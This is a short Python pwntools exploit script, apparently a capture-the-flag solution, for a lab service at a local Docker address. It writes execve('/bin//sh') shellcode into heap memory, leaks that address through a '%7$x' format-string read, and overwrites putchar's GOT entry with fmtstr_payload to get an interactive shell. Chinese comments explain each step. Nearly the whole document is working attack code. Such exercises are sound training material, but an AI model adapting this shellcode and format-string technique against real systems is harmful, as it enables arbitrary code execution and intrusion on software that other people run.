#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("172.17.0.2", 10001)
context.update(arch = 'i386', os = 'linux')

putchar_got = 0x0804B038

shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"

io.sendline('1')		#使用功能1将shellcode写入到malloc出来的地址中
io.recv()
io.sendline(shellcode)
io.recv()
io.sendline('1')

io.sendline('3')
io.recv()
io.sendline('%7$x')		#泄露shellcode所在地址
io.recvuntil("Searching with: ")
content = io.recv()
shellcode_addr = int('0x'+content[:content.find('\n')], 16)					#从数据中筛选出shellcode所在地址
log.info("shellcode address at %#x", shellcode_addr)

io.sendline('3')													
io.recv()
io.sendline(fmtstr_payload(11, {putchar_got:shellcode_addr}))				#fmtstr_payload(offset, {write_addr:write_data})第11个参数可以被我们控制
io.interactive()
